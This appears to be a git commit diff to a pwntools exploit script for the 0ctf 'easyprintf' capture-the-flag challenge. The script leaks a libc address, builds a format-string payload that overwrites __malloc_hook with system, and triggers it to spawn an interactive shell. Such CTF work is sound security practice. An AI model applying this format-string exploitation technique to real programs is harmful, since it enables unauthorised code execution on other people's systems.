7a2301d2091e22f42517a6a83a170790d746ea98
B3t4M3Ee <986256128@qq.com>
2018-04-23 09:20:27 +0800

    0ctf easyprintf hack with malloc hook
    0ctf easyprintf hack with malloc hook

--- Pwn/4-22/ex4-22.py
+++ Pwn/4-22/ex4-22.py
@@ -14,19 +14,19 @@ log.info("puts_adress:%s",hex(data));
 libc.address=data-libc.symbols['puts']
 log.info("hook:%s",hex(libc.symbols['__malloc_hook']));
 log.info("system_adress:%s",hex(libc.symbols['system']));
+log.info("malloc_adress:%s",hex(libc.symbols['malloc']));
 sh="sh;y"
-bss=0x0804a14c
+bss=0x0804a000+0xcc
 B=u32(sh);
-payload=fmtstr_payload(offset, {bss:B,libc.symbols['__malloc_hook']:libc.symbols['system']},numbwritten = 0,write_size = 'short')
+payload=fmtstr_payload(offset, {bss:B,libc.symbols['__malloc_hook']:libc.symbols['system']})
 lenth=len(payload)
 print lenth
 if False:
-    gdb.attach(p,'''
-    b *0x804881b
-    continue
-    ''')
+	gdb.attach(p,'''
+	b *0x804881b
+	continue
+	''')
 
-#raw_input()
-p.sendline(payload+"%{}c".format(bss-0x20))
+p.sendline(payload+"0xdeadbeef"+"%{}c".format(bss-0x20))
 p.clean()
 p.interactive();
